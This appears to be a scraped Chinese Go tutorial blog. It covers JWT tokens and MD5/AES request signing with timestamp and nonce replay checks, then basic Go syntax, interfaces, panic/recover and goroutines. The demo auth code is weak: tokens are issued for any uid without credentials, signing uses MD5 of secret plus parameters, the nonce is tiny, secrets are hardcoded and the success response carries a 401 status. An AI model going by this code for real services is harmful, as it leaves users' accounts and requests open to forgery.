&quot;alg&quot;: &quot;HS256&quot;} Claims声明声明中有jwt自身预置的，使用时可选。当然，我们也可以加入自定义的声明，如下面例子中的Claims的UserId信息，但一定不要声明重要或私密的信息，因为这些信息是可破解的。 Signature签名在生成jwt的token（令牌的意思）串时，先将Header和Claims用base64编码,再用Header中指定的加密算法，将编码后的2个字符串进行加密（签名）,作用是防止数据篡改。加密时需要用到一个signString签名串(例子中的jwtkey)，我们可指定自己的signString，不同的signString生成的加密结果不一样（解密时可能也需要同样的串，视加密算法而定）。签名部分主要和token的安全性有关，Signature的生成依赖前面两部分。首先将Base64编码后的Header和Payload用.连接在一起， 令牌的用法一般如下： 客户端没有令牌时（第一次登陆或者令牌超时失效了）需要先请求生成令牌，此时可能需要玩家输入账号密码给服务器校验 账号密码校验正确后，服务器会生成token返回给客户端 后续客户端访问服务器只需要在header上带上token即可，无需再输入账号密码 服务器从token解析出该token对应的玩家uid，即验证了玩家身份，使用该uid继续后面的逻辑处理。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package mainimport ( &quot;fmt&quot; &quot;net/http&quot; &quot;time&quot; &quot;github.com/dgrijalva/jwt-go&quot; &quot;github.com/gin-gonic/gin&quot;)var jwtkey = []byte(&quot;lijunshi2015@163.com&quot;) // 这个秘钥需要跟代码分开存储，这样才符合安全规范type Claims struct { UserId string jwt.StandardClaims}func main() { r := gin.Default() r.GET(&quot;/get_token&quot;, genToken) r.GET(&quot;/check_token&quot;, checkToken) r.Run(&quot;:8080&quot;)}// 颁发token,请求参数为?uid=xxxfunc genToken(ctx *gin.Context) { uid := ctx.Query(&quot;uid&quot;) expireTime := time.Now().Add(7 * 24 * time.Hour) // 24小时后token过期 claims := &amp;Claims { UserId : uid, StandardClaims: jwt.StandardClaims { ExpiresAt: expireTime.Unix(), // 过期时间 IssuedAt: time.Now().Unix(), // 颁发时间 Issuer: &quot;127.0.0.1&quot;, // token颁发者 Subject: &quot;user token&quot;, // token主题 }, } token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims) fmt.Println(token) tokenString, err := token.SignedString(jwtkey) if err != nil { fmt.Println(err) } ctx.JSON(200, gin.H{&quot;token&quot;: tokenString})}// 验证tokenfunc checkToken(ctx *gin.Context) { tokenString := ctx.GetHeader(&quot;Authorization&quot;) // 从请求头获取token if tokenString == &quot;&quot; { ctx.JSON(http.StatusUnauthorized, gin.H{&quot;code&quot;: 401, &quot;msg&quot;: &quot;权限不足&quot;}) ctx.Abort() return } // 通过token解析出是哪个玩家(UserId) token, claims, err := parseToken(tokenString) if err != nil || !token.Valid { ctx.JSON(http.StatusUnauthorized, gin.H{&quot;code&quot;: 401, &quot;msg&quot;: &quot;权限不足&quot;}) ctx.Abort() return } fmt.Println(&quot;token valid, uid:&quot;, claims.UserId) ctx.JSON(http.StatusUnauthorized, gin.H{&quot;code&quot;: 200, &quot;uid&quot;: claims.UserId})}func parseToken(tokenString string) (*jwt.Token, *Claims, error) { Claims := &amp;Claims{} token, err := jwt.ParseWithClaims(tokenString, Claims, func(token *jwt.Token) (i interface{}, err error) { return jwtkey, nil }) return token, Claims, err} 没有token时，带上自己的uid请求生成token 12junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/get_token?uid=88998899&quot;{&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI4ODk5ODg5OSIsImV4cCI6MTYyMDU2Mzk5MywiaWF0IjoxNjE5OTU5MTkzLCJpc3MiOiIxMjcuMC4wLjEiLCJzdWIiOiJ1c2VyIHRva2VuIn0.-78Bw3jHNDZyGQgZPWbEfUTodPRIy9PlD0rVuoUO6ks&quot;} 有token时请求头带上token，服务器从token解析出uid，完成身份验证。 12junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_token&quot; -H &quot;Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiI4ODk5ODg5OSIsImV4cCI6MTYyMDU2Mzk5MywiaWF0IjoxNjE5OTU5MTkzLCJpc3MiOiIxMjcuMC4wLjEiLCJzdWIiOiJ1c2VyIHRva2VuIn0.-78Bw3jHNDZyGQgZPWbEfUTodPRIy9PlD0rVuoUO6ks&quot;{&quot;code&quot;:200,&quot;uid&quot;:&quot;88998899&quot;} 防篡改，防重放篡改：API参数篡改就是恶意人通过抓包的方式获取到请求的接口的参数，通过修改相关的参数，达到欺骗服务器的目的，常用的防止篡改的方式是用签名以及加密的方式。 重放：API重放攻击就是把之前窃听到的数据原封不动的重新发送给接收方. 解决方案： 防篡改：签名 防重放：timestamp时间戳 + nonce随机数 timestamp的作用： 每次HTTP请求，都需要加上timestamp参数，然后把timestamp和其他参数一起进行数字签名。HTTP请求从发出到达服务器一般都不会超过60s，所以服务器收到HTTP请求之后，首先判断时间戳参数与当前时间相比较，是否超过了60s，如果超过了则认为是非法的请求。 nonce的作用： 每次HTTP请求，都需要加上nonce随机数。我们将每次请求的nonce参数存储到一个“集合”中，服务器每次处理HTTP请求时，首先判断该请求的nonce参数是否在该“集合”中，如果存在则认为是非法请求。nonce参数在首次请求时，已经被存储到了服务器上的“集合”中，再次发送请求会被识别并拒绝。 nonce的一次性可以解决timestamp参数60s(防止重放攻击)的问题，timestamp可以解决nonce参数“集合”越来越大的问题。= 两种常用的请求签名的方式 Md5(url+key) 的方式进行，URL+Key字符串拼接后的值用MD5加密生成签名，将签名发送到服务器端，同时服务器端已同样的方式计算出签名，然后比较俩个MD5的值是否相同，来确定URL是否被篡改。 AES 对称加密，使用URL和秘钥进行加密。 MD5组合加密解密 123456appKey = &quot;mhxy&quot;appSecret = &quot;xxx&quot;encryptStr = &quot;param_1=xxx&amp;param_2=xxx&amp;ak=&quot;+appKey+&quot;&amp;ts=xxx&quot;+&quot;nonce=xxx&quot;// 自定义验证规则sn = MD5(appSecret + encryptStr) 加密解密都是同一套流程，验证客户端发过来的sn与自己服务器计算的sn是否一致即可。 AES 对称加密 12345appKey = &quot;mhxy&quot;appSecret = &quot;xxx&quot;encryptStr = &quot;param_1=xxx&amp;param_2=xxx&amp;ak=&quot;+appKey+&quot;&amp;ts=xxx&quot;+&quot;nonce=xxx&quot;sn = AesEncrypt(encryptStr, appSecret) 解密： 1decryptStr = AesDecrypt(sn, app_secret) 将加密前的字符串与解密后的字符串做个对比。相同，表示签名验证成功。 利用python生成随机秘钥： 12345&gt;&gt;&gt; import base64&gt;&gt;&gt; import os&gt;&gt;&gt; a = os.urandom(24) &gt;&gt;&gt; base64.b64encode(a)b'eUxqsXD/FkNlMR6nIpGvQh8MVlrNTsP4' 利用MD5做请求签名的例子这个请求验证的例子做了以下的请求验证： 时间戳验证，时间过期或明显不合理的不能通过验证； appKey验证，不是注册业务的请求不能通过验证； 指定时间内收到相同的随机数的请求，不能通过验证，因为有可能是请求被重放了； 验证签名是否一致，验证请求参数是否被篡改； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141package mainimport ( &quot;fmt&quot; &quot;time&quot; &quot;github.com/gin-gonic/gin&quot; &quot;crypto/md5&quot; &quot;encoding/hex&quot; &quot;errors&quot; &quot;strconv&quot; &quot;math/rand&quot; &quot;net/http&quot;)var secretKey string = &quot;eUxqsXD/FkNlMR6nIpGvQh8MVlrNTsP4&quot; // 安全规范要求秘钥跟代码要分开存储var reqMap map[string]map[string]int64 // 一般都是放在redis，用expire控制key的存活时间var appRegist = map[string]int { &quot;mhxy&quot; : 1, &quot;lol&quot; : 1,}var expireTime int64 = 600func MD5(str string) string { s := md5.New() s.Write([]byte(str)) return hex.EncodeToString(s.Sum(nil)) }// 验证签名func md5VerifySign(c *gin.Context) error { ak := c.Query(&quot;ak&quot;) // appKey，业务标记 sn := c.Query(&quot;sn&quot;) // sign，签名 ts := c.Query(&quot;ts&quot;) // timestamp，时间戳 nonce := c.Query(&quot;nonce&quot;) // 随机数 name := c.Query(&quot;name&quot;) uid := c.Query(&quot;uid&quot;) pay := c.Query(&quot;pay&quot;) now := time.Now().Unix() // 验证appkey是否已注册 if _, ok := appRegist[ak]; !ok { return errors.New(&quot;appkey error&quot;) } // 验证过期时间 tsInt, _ := strconv.ParseInt(ts, 10, 64) if tsInt &gt; now || now - tsInt &gt; expireTime { return errors.New(&quot;ts error&quot;) } //验证随机数是否重复 err := getNonce(uid, nonce) if err != nil { return err } //验证签名 // url param需要排序 urlParmString := fmt.Sprintf(&quot;ak=%s&amp;name=%s&amp;nonce=%s&amp;pay=%s&amp;ts=%s&amp;uid=%s&quot;,ak, name, nonce, pay, ts, uid) fmt.Println(&quot;urlParmString:&quot;, urlParmString) if sn == &quot;&quot; || sn != createMd5Sign(urlParmString) { return errors.New(&quot;sn error&quot;) } setNonce(uid, nonce) return nil}// 创建签名func createMd5Sign(str string) string { // 自定义 MD5 组合 return MD5(secretKey + str)}func setNonce(uid string, nonce string) { now := time.Now().Unix() c := make(map[string]int64) c[nonce] = now if _, ok := reqMap[uid]; !ok { reqMap[uid] = make(map[string]int64) } reqMap[uid] = c}func getNonce(uid string, nonce string) error { now := time.Now().Unix() if _, ok := reqMap[uid]; !ok { return nil } if _, ok := reqMap[uid][nonce]; !ok { return nil } if reqMap[uid][nonce] &gt; 0 &amp;&amp; now - reqMap[uid][nonce] &gt; expireTime { delete(reqMap[uid], nonce) return nil } return errors.New(&quot;nonce err&quot;)}func genSign(c *gin.Context) string { ak := c.Query(&quot;ak&quot;) // appKey，业务标记 ts := time.Now().Unix() // timestamp，时间戳 nonce := rand.Intn(100) // 随机数 name := c.Query(&quot;name&quot;) uid := c.Query(&quot;uid&quot;) pay := c.Query(&quot;pay&quot;) urlParmString := fmt.Sprintf(&quot;ak=%s&amp;name=%s&amp;nonce=%d&amp;pay=%s&amp;ts=%d&amp;uid=%s&quot;,ak, name, nonce, pay, ts, uid) sn := createMd5Sign(urlParmString) return fmt.Sprintf(&quot;%s&amp;sn=%s&quot;, urlParmString,sn)}func main() { reqMap = map[string]map[string]int64{} r := gin.Default() r.GET(&quot;/gen_sign&quot;, func(c *gin.Context) { sign := genSign(c) fmt.Println(&quot;生成签名：&quot;, sign) c.String(http.StatusOK, sign) }) r.GET(&quot;/check_sign&quot;, func(c *gin.Context) { err := md5VerifySign(c) if err != nil { fmt.Println(&quot;验证签名失败：&quot;, err) c.String(http.StatusOK, fmt.Sprintf(&quot;验证签名失败, 原因：%+v&quot;, err)) return } fmt.Println(&quot;验证签名成功！&quot;) c.String(http.StatusOK, &quot;验证签名成功&quot;) }) r.Run() // listen and serve on 0.0.0.0:8080} 实验过程请求gen_sign获得签名和拼接好的url param请求串 123junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/gen_sign?ak=mhxy&amp;name=james&amp;pay=100&amp;uid=9988998&quot; ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=100&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32djunshide 如果我们篡改请求串然后再去请求签名验证，比如pay字段我们改为1000，会提示验证失败，原因是签名对不上失败了 12junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_sign?ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=1000&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32d&quot; 验证签名失败, 原因：sn error 如果我们不修改请求串，直接请求验证签名，签名验证成功 12junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_sign?ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=100&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32d&quot; 验证签名成功 我们重放这个请求，提示签名失败，原因是随机数重复了 12junshideMacBook-Pro:web junshili$ curl &quot;http://localhost:8080/check_sign?ak=mhxy&amp;name=james&amp;nonce=81&amp;pay=100&amp;ts=1620020732&amp;uid=9988998&amp;sn=48247171223ff1b4739ca300e3b7d32d&quot; 验证签名失败, 原因：nonce err","link":"/2021/05/05/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AF%87/"},{"title":"Go快速上手—基本语言特性篇","text":"编译和运行 go run main.go 直接运行 go build -o test main.go 指定文件名输出二进制文件 基础语法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217package mainimport ( &quot;fmt&quot; &quot;reflect&quot; &quot;os&quot; &quot;errors&quot;)func add(num int){ num += 1}func realAdd(num *int){ *num += 1}func add2 (n1 int, n2 int) (int, int) { return n1+n2, n1-n2}func say(name string) error { if len(name) == 0 { return errors.New(&quot;error:name is null&quot;) } fmt.Println(&quot;hello &quot;, name) return nil}type Student struct { name string age int info map[string]string}func (stu *Student) hello(person string) string { return fmt.Sprintf(&quot;hello %s, i am %s&quot;, person, stu.name)}func get(index int) (ret int) { defer func() { if r := recover(); r != nil { fmt.Println(&quot;some err happens!&quot;, r) } ret = -1 }() arr := [3]int{2,3,4} return arr[index]}func main() { var name string = &quot;Hello world!&quot; var a = 1 //默认是整型 b := 2 c := &quot;my name&quot; var d int // 默认为0 var e byte = 'a' var f int8 = 1 var g float32 = 1.0 ok := false str1 := &quot;Go学习&quot; // 中文一个字一般占3个字节 fmt.Println(name) fmt.Println(a,b,c,d,e,f,g,ok) // 1 2 my name 0 97 1 1 false fmt.Println(reflect.TypeOf(str1[2]).Kind()) // 打印类型,uint8 fmt.Printf(&quot;%d %c\\n&quot;, str1[1], str1[1]) fmt.Println(&quot;len(str1)=&quot;, len(str1)) // 8字节 //将str1切割成rune数组，一个元素是一个汉字或字母 //转换成 []rune 类型后，字符串中的每个字符，无论占多少个字节都用 int32 来表示，因而可以正确处理中文。 //rune 类型，代表一个 UTF-8 字符，当需要处理中文、日文或者其他复合字符时，则需要用到 rune 类型。rune 类型等价于 int32 类型。 runeArr := []rune(str1) // 等价于 runeArr := []int32(str1) fmt.Println(reflect.TypeOf(runeArr[2]).Kind()) // int32 fmt.Printf(&quot;%d %c\\n&quot;, runeArr[2], runeArr[2]) // 23398 学 fmt.Println(&quot;len(runeArr)=&quot;, len(runeArr)) // 4，元素个数 // 声明数组 var arr [5]int var arr2 [5][5]int // 二维 // 声明+初始化 var arr3 = [5]int{1,2,3,4,5} arr4 := [5]int{1,2,3,4,5} for i := 0; i &lt; len(arr3); i++ { arr3[i] += 100 } fmt.Println(arr) fmt.Println(arr2) fmt.Println(arr3) fmt.Println(arr4) //数组的长度不能改变，如果想拼接2个数组，或是获取子数组，需要使用切片。 // 切片是数组的抽象。 切片使用数组作为底层结构。 slice1 := make([]float32, 0) // 长度为0的切片 slice2 := make([]float32, 3, 5) // 长度为3容量为5的切片 fmt.Println(len(slice1), cap(slice2)) // 0 5 slice2 = append(slice2, 1, 2, 3, 4) fmt.Println(len(slice2), cap(slice2)) // 7 12 fmt.Println(slice2) sub1 := slice2[3:] //[1 2 3 4] sub2 := slice2[:4] // [0 0 0 1] sub3 := slice2[1:5] // [0 0 1 2] combine := append(sub1, sub2...) ///sub2... 是切片解构的写法，将切片解构为 N 个独立的元素。[1 2 3 4 0 0 0 1] fmt.Println(sub1) fmt.Println(sub2) fmt.Println(sub3) fmt.Println(combine) m1 := make(map[string]int) // 声明加初始化 m2 := map[string]int { &quot;grade&quot; : 100, &quot;level&quot; : 1, } m1[&quot;grade&quot;] = 101 fmt.Println(m1) fmt.Println(m2) ss := &quot;golang&quot; var p *string = &amp;ss // p 是指向ss的指针 *p = &quot;golang-gogo&quot; fmt.Println(ss, *p) // golang-gogo golang-gogo //一般来说，指针通常在函数传递参数，或者给某个类型定义新的方法时使用。 //Go 语言中，参数是按值传递的，如果不使用指针，函数内部将会拷贝一份参数的副本，对参数的修改并不会影响到外部变量的值。 //如果参数使用指针，对参数的传递将会影响到外部变量。 a1 := 1 add(a1) fmt.Println(a1) // 1 realAdd(&amp;a1) fmt.Println(a1) // 2 // Go 语言中没有枚举(enum)的概念，一般可以用常量的方式来模拟枚举。 type Gender int8 // 跟c的typedef一样的 const ( MALE Gender = 1 FEMALE Gender = 2 ) //Go 语言的 switch 不需要 break，匹配到某个 case，执行完该 case 定义的行为后，默认不会继续往下执行。如果需要继续往下执行，需要使用 fallthrough gender := MALE switch gender { case MALE: fmt.Println(&quot;i am male&quot;) fallthrough case FEMALE: fmt.Println(&quot;i am female&quot;) default: fmt.Println(&quot;unknown&quot;) } //output: //i am male //i am female // 遍历 nums := []int{10, 20, 30} for i, num := range nums { fmt.Println(i, num) } mm2 := map[string]string { &quot;key1&quot;: &quot;val1&quot;, &quot;key2&quot;: &quot;val2&quot;, } for key,val := range mm2 { fmt.Println(key, val) } for i, num := range combine { fmt.Println(i, num) } // 如果调用成功，error 的值是 nil， // 如果调用失败，例如文件不存在，我们可以通过 error 知道具体的错误信息。 _, err := os.Open(&quot;a.txt&quot;) if err != nil{ fmt.Println(err) } err = say(&quot;&quot;) if err != nil{ fmt.Println(err) } // error 往往是能预知的错误，但是也可能出现一些不可预知的错误， // 例如数组越界，这种错误可能会导致程序非正常退出，在 Go 语言中称之为 panic。 fmt.Println(get(5)) fmt.Println(&quot;finished&quot;) // 在 get 函数中，使用 defer 定义了异常处理的函数，在协程退出前，会执行完 defer 挂载的任务。因此如果触发了 panic，控制权就交给了 defer。 // 在 defer 的处理逻辑中，使用 recover，使程序恢复正常，并且将返回值设置为 -1，在这里也可以不处理返回值，如果不处理返回值，返回值将被置为默认值 0。 //结构体和方法 stu := &amp;Student { name: &quot;Tom&quot;, age: 19, } msg := stu.hello(&quot;Ken&quot;) fmt.Println(msg) // 可以new方法来new 实例 stu2 := new(Student) stu2.name = &quot;kk&quot; fmt.Println(stu2.hello(&quot;Alice&quot;)) // 空接口,定义了一个没有任何方法的空接口，那么这个接口可以表示任意类型 mmp := make(map[string]interface{}) mmp[&quot;name&quot;] = &quot;james&quot; mmp[&quot;age&quot;] = 20 mmp[&quot;score&quot;] = [3]int{1,2,3} mmp[&quot;info&quot;] = m2 fmt.Println(mmp) // map[age:20 info:map[grade:100 level:1] name:james score:[1 2 3]]} 方法和接口在 Go 中，只需使用大写标识符，即可公开方法，使用非大写的标识符将方法设为私有方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344package main// main.goimport ( &quot;fmt&quot;)type triangle struct { size int}func (t triangle) perimeter() int { return t.size * 3}// 指针可以直接修改变量值，而不发生复制func (t *triangle) doubleSize() { t.size *= 2}type colorTriangle struct { triangle color string}// 重载方法，没有重载该方法时，调用的是triangle的perimeter()func (t colorTriangle) perimeter() int { return t.size * 2 * 3}func main() { t := triangle{3} fmt.Println(&quot;perimeter:&quot;, t.perimeter()) t.doubleSize() fmt.Println(&quot;doublesize:&quot;, t.perimeter()); s := colorTriangle{triangle{4}, &quot;blue&quot;} fmt.Println(&quot;perimeter color:&quot;, s.perimeter()) fmt.Println(&quot;perimeter normal:&quot;, s.triangle.perimeter())} 输出 1234perimeter: 9doublesize: 18perimeter color: 24perimeter normal: 12 Go 中的接口是一种用于表示其他类型的行为的数据类型。 在你使用接口时，你的基本代码将变得更加灵活、适应性更强，因为你编写的代码未绑定到特定的实现。接口就是只声明了函数，但是函数尚未具体实现。 Go 中的接口是一种抽象类型，只包括具体类型必须拥有或实现的方法。 1234type Shape interface { Perimeter() float64 Area() float64} 接口interface一般而言，接口定义了一组方法的集合，接口不能被实例化，一个类型可以实现多个接口。 这里的接口跟C++的多态性质比较像，一个interface可以指向任何实现了其定义的方法的struct，这就好比C++的基类指针指向子类对象，实现多态。 ==对于任何数据类型，只要它的方法集合中完全包含了一个接口的全部特征（即全部的方法），那么它就一定是这个接口的实现类型。== 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package mainimport ( &quot;fmt&quot;)type Person interface { getName() string}type Student struct { name string age int}func (stu *Student) getName() string { return stu.name}type Worker struct { name string gender string}func (wk * Worker) getName() string { return wk.name}func main() { var stu = Student{ name: &quot;Tom&quot;, age: 18, } var p Person = &amp;stu // 接口转为实例 fmt.Println(p.getName()) var wk = Worker{ name: &quot;Ken&quot;, gender: &quot;Male&quot;, } p = &amp;wk //接口转为实例 fmt.Println(p.getName()) //如果定义了一个没有任何方法的空接口，那么这个接口可以表示任意类型 m := make(map[string]interface{}) m[&quot;name&quot;] = &quot;Alice&quot; m[&quot;age&quot;] = 19 m[&quot;score&quot;] = [3]int{98, 99, 85} fmt.Println(m)} 输出 123TomKenmap[age:19 name:Alice score:[98 99 85]] 怎样判定一个数据类型的某一个方法实现的就是某个接口类型中的某个方法呢？ 这有两个充分必要条件，一个是“两个方法的签名需要完全一致”，另一个是“两个方法的名称要一模一样”。 两个方法的签名需要完全一致，这就是表示方法的实现的形参、顺序、返回值必须一致，才会有相同的方法签名。 扩展现有的方法现有的实现，io.Copy，将http get回来的数据打印到终端上。现在我们希望重载这个Copy方法，以我们需要的方式打印返回结果。 123456789101112131415161718package mainimport ( &quot;fmt&quot; &quot;io&quot; &quot;net/http&quot; &quot;os&quot;)func main() { resp, err := http.Get(&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;) if err != nil { fmt.Println(&quot;Error:&quot;, err) os.Exit(1) } io.Copy(os.Stdout, resp.Body)} 输出 12[{&quot;id&quot;:276496384,&quot;node_id&quot;:&quot;MDEwOlJlcG9zaXRvcnkyNzY0OTYzODQ=&quot;,&quot;name&quot;:&quot;-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;full_name&quot;:&quot;microsoft/-Users-deepakdahiya-Desktop-juhibubash-test21zzzzzzzzzzz&quot;,&quot;private&quot;:false,&quot;owner&quot;:{&quot;login&quot;:&quot;microsoft&quot;,&quot;id&quot;:6154722,&quot;node_id&quot;:&quot;MDEyOk9yZ2FuaXphdGlvbjYxNTQ3MjI=&quot;,&quot;avatar_url&quot;:&quot;https://avatars2.githubusercontent.com/u/6154722?v=4&quot;,&quot;gravatar_id&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://api.github.com/users/microsoft&quot;,&quot;html_url&quot;:&quot;https://github.com/micro.... io.Copy的实现 12345func Copy(dst Writer, src Reader) (written int64, err error)type Writer interface { Write(p []byte) (n int, err error)} 注意到Writer是空接口，里面实现了write方法。因此我们重新定义一个Writer接口，幷实现这个Write方法 1234567891011121314151617181920212223242526272829303132333435package mainimport ( &quot;fmt&quot; &quot;io&quot; &quot;net/http&quot; &quot;os&quot; &quot;encoding/json&quot;)type GitHubResponse []struct { FullName string `json:&quot;full_name&quot;`}type customWriter struct {}func (w customWriter) Write(p []byte) (n int, err error) { var resp GitHubResponse json.Unmarshal(p, &amp;resp) for _, r := range resp { fmt.Println(r.FullName) } return len(p), nil}func main() { resp, err := http.Get(&quot;https://api.github.com/users/microsoft/repos?page=15&amp;per_page=5&quot;) if err != nil { fmt.Println(&quot;Error:&quot;, err) os.Exit(1) } writer := customWriter{} io.Copy(writer, resp.Body)} 输出 1234microsoft/aed-content-nasa-su20microsoft/aed-external-learn-templatemicrosoft/aed-go-learn-contentmicrosoft/aed-learn-template defer和panicdefer 语句会推迟函数（包括任何参数）的运行，直到包含 defer 语句的函数完成。 通常情况下，当你想要避免忘记任务（例如关闭文件或运行清理进程）时，可以推迟某个函数的运行。 内置 panic() 函数会停止正常的控制流。 所有推迟的函数调用都会正常运行。 进程会在堆栈中继续，直到所有函数都返回。 然后，程序会崩溃并记录日志消息。 此消息包含错误和堆栈跟踪，有助于诊断问题的根本原因。 这是panic和defer组合使用的例子 1234567891011121314151617181920212223242526package main// main.goimport ( &quot;fmt&quot;)func main() { gg(0) fmt.Println(&quot;Program finished succ!&quot;)}func gg(i int) { if (i &gt; 3) { fmt.Println(&quot;throw panic!!!&quot;) panic(&quot;Panic in gg&quot;) } defer func() { fmt.Println(&quot;Defer in gg, i=&quot;, i) }() fmt.Println(&quot;Printing in gg. i=&quot;, i) gg(i+1)} 输出 123456789101112131415161718192021222324rinting in gg. i= 0Printing in gg. i= 1Printing in gg. i= 2Printing in gg. i= 3throw panic!!!Defer in gg, i= 3Defer in gg, i= 2Defer in gg, i= 1Defer in gg, i= 0panic: Panic in gggoroutine 1 [running]:main.gg(0x4) /Users/junshili/Desktop/golearn/main.go:18 +0x195main.gg(0x3) /Users/junshili/Desktop/golearn/main.go:25 +0xfemain.gg(0x2) /Users/junshili/Desktop/golearn/main.go:25 +0xfemain.gg(0x1) /Users/junshili/Desktop/golearn/main.go:25 +0xfemain.gg(0x0) /Users/junshili/Desktop/golearn/main.go:25 +0xfemain.main() /Users/junshili/Desktop/golearn/main.go:11 +0x2e 注意输出“Defer in gg”是采用逆序（后进先出）。最后的fmt.Println(&quot;Program finished succ!&quot;)并没有执行，这是因为panic出现后，程序就会退出。 recoverGo 提供内置函数 recover()，允许你在出现紧急状况之后重新获得控制权。 只能在已推迟的函数中使用此函数。 如果调用 recover() 函数，则在正常运行的情况下，它会返回 nil，没有任何其他作用。 12345678910111213141516171819202122232425262728293031package main// main.goimport ( &quot;fmt&quot;)func main() { defer func() { if r := recover(); r != nil { fmt.Println(&quot;Recovered in main&quot;, r) } }() gg(0) fmt.Println(&quot;Program finished succ!&quot;)}func gg(i int) { if (i &gt; 3) { fmt.Println(&quot;throw panic!!!&quot;) panic(&quot;Panic in gg&quot;) } defer func() { fmt.Println(&quot;Defer in gg, i=&quot;, i) }() fmt.Println(&quot;Printing in gg. i=&quot;, i) gg(i+1)} 输出 12345678910Printing in gg. i= 0Printing in gg. i= 1Printing in gg. i= 2Printing in gg. i= 3throw panic!!!Defer in gg, i= 3Defer in gg, i= 2Defer in gg, i= 1Defer in gg, i= 0Recovered in main Panic in gg 这个版本跟上一个panic+defer的版本相比，输出少了堆栈信息，控制流同样是中断了，输出顺序是一样的。 ==panic 和 recover 的组合是 Go 处理异常的惯用方式。 其他编程语言使用 try/catch 块。 Go 首选此处所述的方法。== 并发编程goroutine编写并发程序时最大的问题是在进程之间共享数据。Go 是通过 channel 来回传递数据的。 这意味着只有一个活动 (goroutine) 有权访问数据，设计上不存在争用条件。 单线程写法 123456789101112131415161718192021222324package main// gorountine 并发编程import ( &quot;fmt&quot; &quot;time&quot;)func download(url string) { fmt.Println(&quot;start donwload,url=&quot;, url) time.Sleep(time.Second * 5) // 模拟耗时}func main() { fmt.Println(&quot;start all download, time=&quot;, time.Now().Format(&quot;2006-01-02 15:04:05&quot;)) t1 := time.Now() for i := 0; i &lt; 10; i++ { download(&quot;www.test_go.com/index&quot; + string(i + '0')) } t2 := time.Since(t1) / time.Second fmt.Printf(&quot;download done, time_use=%ds\\n&quot;, t2)} 输出 1234567891011start all download, time= 2021-04-29 23:45:46start donwload,url= www.test_go.com/index0start donwload,url= www.test_go.com/index1start donwload,url= www.test_go.com/index2start donwload,url= www.test_go.com/index3start donwload,url= www.test_go.com/index4start donwload,url= www.test_go.com/index5start donwload,url= www.test_go.com/index6start donwload,url= www.test_go.com/index7start donwload,url= www.test_go.com/index8start donwload,url= www.test_go. gorountine写法 12345678910111213141516171819202122232425262728293031package main// goroutine 并发编程import ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)var wg sync.WaitGroupfunc download(url string) { fmt.Println(&quot;start donwload,url=&quot;, url) time.Sleep(time.Second * 5) // 模拟耗时 wg.Done() }func main() { fmt.Println(&quot;start all download, time=&quot;, time.Now().Format(&quot;2006-01-02 15:04:05&quot;)) t1 := time.Now() for i := 0; i &lt; 10; i++ { wg.Add(1) // 为 wg 添加一个计数，wg.Done()，减去一个计数。 go download(&quot;www.test_go.com/index&quot; + string(i + '0')) //启动新的协程并发执行 download 函数。 } wg.Wait() //等待所有的协程执行结束。 t2 := time.Since(t1) / time.Second fmt.Printf(&quot;download done, time_use=%ds\\n&quot;, t2)} 输出 123456789101112start all download, time= 2021-04-29 23:49:27start donwload,url= www.test_go.com/index9start donwload,url= www.test_go.com/index0start donwload,url= www.test_go.com/index1start donwload,url= www.test_go.com/index2start donwload,url= www.test_go.com/index6start donwload,url= www.test_go.com/index7start donwload,url= www.test_go.com/index8start donwload,url= www.test_go.com/index3start donwload,url= www.test_go.com/index4start donwload,url= www.test_go.com/index5download done, time_use=5s 许多程序喜欢使用匿名函数来创建 goroutine，如下所示： 123456func main(){ login() go func() { launch() }()} 利用channel进行协程间通信Channel是Go中的一个核心类型，你可以把它看成一个管道，通过它并发核心单元就可以发送或者接收数据进行通讯(communication)。 Channel可以作为一个先入先出(FIFO)的队列，接收的数据和发送的数据的顺序是一致的。 channel使用的语法 123ch &lt;- x // sends (or write) x through channel chx = &lt;-ch // x receives (or reads) data sent to the channel ch&lt;-ch // receives data, but the result is discarded 往一个已经被close的channel中继续发送数据会导致run-time panic。 往nil channel中发送、接收数据会一致被阻塞着。 从一个被close的channel中接收数据不会被阻塞，而是立即返回，接收完已发送的数据后会返回元素类型的零值(zero value)。 如前所述，你可以使用一个额外的返回参数来检查channel是否关闭。如果OK 是false，表明接收的x是产生的零值，这个channel被关闭了或者为空。 1x, ok := &lt;-ch 循环处理channel的消息,如果通过range读取，channel关闭后for循环会跳出： 123for i := range c { fmt.Println(i)} 12345678910111213141516171819202122232425262728293031323334353637package main// gorountine 并发编程，利用channel进行协程间通信import ( &quot;fmt&quot; &quot;time&quot;)var ch = make(chan string, 10) // 